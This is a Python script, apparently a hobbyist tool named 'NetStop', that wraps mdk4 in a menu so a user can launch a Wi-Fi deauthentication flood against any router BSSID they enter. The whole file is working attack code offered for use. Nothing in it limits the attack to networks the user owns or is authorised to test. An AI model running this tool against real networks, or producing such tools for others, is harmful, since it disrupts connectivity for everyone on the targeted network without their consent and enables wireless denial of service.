#!/usr/bin/env python3
import subprocess
import os
import sys
import time

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

def clear_screen():
    os.system('clear')

def show_banner():
    clear_screen()
    print(f"{GREEN}" + r" _  _ _  _ ____ ___  _ ____ ___ ____ _  _ " + f"{RESET}")
    print(f"{GREEN}" + r" |_/  |  | |__/ |  \ | [__   |  |__| |\ | " + f"{RESET}")
    print(f"{YELLOW}" + r" | \_ |__| |  \ |__/ | ___]  |  |  | | \| " + f"{RESET}")
    print(f"{CYAN}==============================================={RESET}")
    print(f"{RED}          NetStop Tool (MDK4 Edition)          {RESET}")
    print(f"{GREEN}       Developed by: mohamedgarde46-maker      {RESET}")
    print(f"{CYAN}==============================================={RESET}")
    print(f"{YELLOW}    Wireless Network Deauth & Isolation Tool   {RESET}")
    print(f"{CYAN}==============================================={RESET}")

def start_attack(interface, bssid):
    show_banner()
    print(f"{RED}[+] Attack started on BSSID: {bssid}{RESET}")
    print(f"{YELLOW}[*] Running mdk4 live... Press (Ctrl + C) to stop the attack.{RESET}\n")
    
    command = ["sudo", "mdk4", interface, "d", "-a", bssid]
    try:
        subprocess.run(command)
    except KeyboardInterrupt:
        print(f"\n{GREEN}[+] Attack stopped. Connection restored! ✅{RESET}")
        time.sleep(2)
    except Exception as e:
        print(f"{RED}[-] Error running attack: {e}{RESET}")
        time.sleep(3)

def main():
    if os.geteuid() != 0:
        print(f"{RED}[-] Error: Please run this tool as root using 'sudo'!{RESET}")
        print(f"{YELLOW}Example: sudo python3 app.py{RESET}")
        sys.exit(1)

    while True:
        show_banner()
        print(f"{CYAN}[1]{RESET} Start Wireless Deauth Attack 🚫")
        print(f"{CYAN}[2]{RESET} Exit Tool ❌")
        print()
        
        choice = input(f"{YELLOW}Select an option (1 or 2): {RESET}").strip()
        
        if choice == '1':
            show_banner()
            interface = input(f"{CYAN}[*] Enter Wireless Interface (e.g., wlan0mon): {RESET}").strip()
            bssid = input(f"{CYAN}[*] Enter Target Router BSSID (MAC): {RESET}").strip()
            
            if not interface or not bssid:
                print(f"{RED}[-] Error: Missing fields! Both fields are required.{RESET}")
                time.sleep(2)
                continue
            start_attack(interface, bssid)
        elif choice == '2':
            print(f"{GREEN}\nThank you for using NetStop! Goodbye 👋{RESET}")
            break
        else:
            print(f"{RED}[-] Invalid option! Please choose 1 or 2.{RESET}")
            time.sleep(1)

if __name__ == '__main__':
    main()
